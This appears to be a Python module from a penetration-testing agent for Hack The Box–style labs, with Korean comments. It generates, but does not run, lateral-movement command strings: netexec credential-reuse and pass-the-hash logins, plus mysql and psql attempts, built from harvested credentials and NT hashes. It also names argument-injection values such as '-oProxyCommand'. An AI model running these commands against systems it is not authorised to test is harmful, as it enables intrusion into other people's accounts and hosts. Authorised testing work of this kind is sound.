"""측면 이동(lateral movement) 후보 생성 (생성 전용 — 실행·발사 없음).

HTB 머신형 공략의 흔한 lateral 축: 한 곳에서 얻은 **크리덴셜(user:pass)·NT 해시**를, 대상의
**열린 다른 서비스**(SSH·SMB·WinRM·RDP·MSSQL·FTP·MySQL·PostgreSQL)에 '재사용(credential
reuse)'하거나 '해시 전달(Pass-the-Hash)'로 시도하는 것이다. 이 모듈은 그 **후보 명령 문자열만**
만든다 — 에이전트는 실행·무차별 대입 발사를 하지 않는다(안전 경계). 사용자가 권한 확인 자산에서
직접 돌린다.

안전·정직성(§3/§4):
  · 근거 있는 것만 — 실제로 '수확한' 크리덴셜/해시와 '관측된' 열린 서비스에서만 생성(지어내지 않음).
  · 생성 전용 — 전부 문자열. 사용자/패스워드/해시는 shlex 로 인용해 주입을 막는다.
  · 폭주 방지 — 크리덴셜·후보 수 상한(스프레이 남발 방지).
"""
from __future__ import annotations

import shlex
from dataclasses import dataclass

# 포트 → (서비스 키, netexec 프로토콜 | None). None 이면 네이티브 클라이언트로 후보 생성.
_PORT_SVC: dict[int, tuple[str, str | None]] = {
    21: ("ftp", "ftp"),
    22: ("ssh", "ssh"),
    139: ("smb", "smb"),
    445: ("smb", "smb"),
    1433: ("mssql", "mssql"),
    3306: ("mysql", None),
    3389: ("rdp", "rdp"),
    5432: ("postgres", None),
    5985: ("winrm", "winrm"),
    5986: ("winrm", "winrm"),
}
# NT 해시 전달(PtH)이 의미 있는 서비스(netexec -H).
_PTH_SVC = {"smb", "winrm", "mssql", "rdp"}

_MAX_CREDS = 6        # 재사용 시도할 크리덴셜 상한(스프레이 남발 방지)
_MAX_CANDIDATES = 40  # 총 후보 상한


def _arg_safe(v: str) -> bool:
    """명령 인자로 안전한 '수확값'인지. shlex.quote 가 셸 메타문자는 막지만, 선행 '-' 는
    클라이언트(mysql/psql·nxc)가 '옵션'으로 오인하는 인자 인젝션이 되므로 추가로 거른다.
    (수확 크리덴셜/해시는 대상 유래 신뢰불가 값 — 예: user `-reconnect`, `-oProxyCommand=…`.)"""
    return bool(v) and not v.startswith("-")


@dataclass
class LateralCandidate:
    technique: str   # "cred-reuse" | "pass-the-hash"
    service: str     # ssh/smb/winrm/...
    command: str     # 생성된 후보 명령(문자열 — 실행 아님)
    why: str = ""


def _services(open_ports) -> list[tuple[str, str | None]]:
    """열린 포트 → (서비스 키, nxc 프로토콜) 목록(중복 서비스 제거, 결정적 순서)."""
    out: list[tuple[str, str | None]] = []
    seen: set[str] = set()
    for p in open_ports or []:
        svc = _PORT_SVC.get(int(p))
        if svc and svc[0] not in seen:
            seen.add(svc[0])
            out.append(svc)
    return out


def _reuse_command(svc: str, proto: str | None, target: str, user: str, pw: str) -> str:
    """크리덴셜 재사용 후보(평문 user:pass)."""
    if not (_arg_safe(user) and _arg_safe(pw)):
        return ""   # 선행 '-' 인자 인젝션 방어(수확값은 신뢰불가)
    u, p, t = shlex.quote(user), shlex.quote(pw), shlex.quote(target)
    if proto:   # netexec(nxc) 지원 프로토콜 — 통일된 재사용 점검
        return f"nxc {proto} {t} -u {u} -p {p}"
    if svc == "mysql":
        return f"mysql -h {t} -u {u} -p{p} -e {shlex.quote('show databases;')}"
    if svc == "postgres":
        return f"PGPASSWORD={p} psql -h {t} -U {u} -w -l"
    return ""


def _pth_command(svc: str, proto: str | None, target: str, user: str, nthash: str) -> str:
    """NT 해시 전달(Pass-the-Hash) 후보 — SMB/WinRM 등."""
    if not (_arg_safe(user) and _arg_safe(nthash)):
        return ""   # 선행 '-' 인자 인젝션 방어(수확값은 신뢰불가)
    u, t, h = shlex.quote(user), shlex.quote(target), shlex.quote(nthash)
    if proto and svc in _PTH_SVC:
        return f"nxc {proto} {t} -u {u} -H {h}"
    return ""


def generate(target: str, creds: list[tuple[str, str]],
             nt_hashes: list[tuple[str, str]], open_ports) -> list[LateralCandidate]:
    """수확한 크리덴셜/해시 × 열린 서비스 → 측면 이동 후보(생성 전용). 중복 제거·상한."""
    if not target:
        return []
    services = _services(open_ports)
    if not services:
        return []
    out: list[LateralCandidate] = []
    seen: set[str] = set()

    def _add(technique: str, svc: str, cmd: str, why: str) -> None:
        if cmd and cmd not in seen and len(out) < _MAX_CANDIDATES:
            seen.add(cmd)
            out.append(LateralCandidate(technique, svc, cmd, why))

    for svc, proto in services:
        for user, pw in (creds or [])[:_MAX_CREDS]:
            _add("cred-reuse", svc, _reuse_command(svc, proto, target, user, pw),
                 f"수확 크리덴셜 {user}:*** 를 {svc} 에 재사용 시도")
    for svc, proto in services:
        for user, nthash in (nt_hashes or [])[:_MAX_CREDS]:
            _add("pass-the-hash", svc, _pth_command(svc, proto, target, user, nthash),
                 f"NT 해시({user}) 전달(PtH)로 {svc} 인증 시도")
    return out


def render_markdown(candidates: list[LateralCandidate]) -> str:
    """측면 이동 후보를 Markdown 으로(없으면 안내). 생성 전용 — 사용자가 검토 후 실행."""
    if not candidates:
        return "_(수확한 크리덴셜/해시 또는 재사용할 열린 서비스가 없어 측면 이동 후보 없음)_"
    lines = ["# 측면 이동 후보(수확 크리덴셜/해시 재사용·PtH — 권한 확인 자산 전용, 검토 후 실행):"]
    for c in candidates:
        lines.append(f"{c.command}   # [{c.technique}/{c.service}] {c.why}")
    return "\n".join(lines)
